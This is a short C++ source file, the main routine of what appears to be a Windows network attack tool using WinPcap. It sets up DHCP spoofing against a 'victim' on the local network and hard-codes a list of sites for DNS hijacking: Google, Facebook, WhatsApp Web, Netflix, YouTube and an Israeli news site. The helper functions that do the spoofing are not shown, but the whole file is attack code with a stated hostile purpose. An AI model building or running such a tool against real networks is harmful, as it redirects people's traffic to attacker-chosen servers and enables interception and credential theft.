#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Spoofing.h"
#include "Headers.h"
#include "Utils.h"
#include <Windows.h>

#define HAVE_REMOTE
#define WPCAP

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")

#include <Mstcpip.h>

int main()
{
	WSADATA wsock;
	WSAStartup(MAKEWORD(2, 2), &wsock);

	AddressInfo info{};

	getAddrInfo(&info);	// Inits all data for the struct, all info referfing the network

	/*Set the list of sites for the dns hijacking-*/
	int nSites = 0;
	info.DNS_sites = (char**)malloc(sizeof(char*) * HIJACKED_SITES);
	info.DNS_sites[nSites++] = (char*)"www.google.com";
	info.DNS_sites[nSites++] = (char*)"www.facebook.com";
	info.DNS_sites[nSites++] = (char*)"web.whatsapp.com";
	info.DNS_sites[nSites++] = (char*)"www.netflix.com";
	info.DNS_sites[nSites++] = (char*)"www.youtube.com";
	info.DNS_sites[nSites++] = (char*)"n12.co.il";
	info.DNS_sites[nSites++] = (char*)"www.n12.co.il";

	setAck(info); // setting the static part of the DHCP ack so it is faster to send it to the vitcim-
	startSpoofing((LPVOID)&info); // start the spoofing of the DHCP and 

	free(info.DNS_sites);
}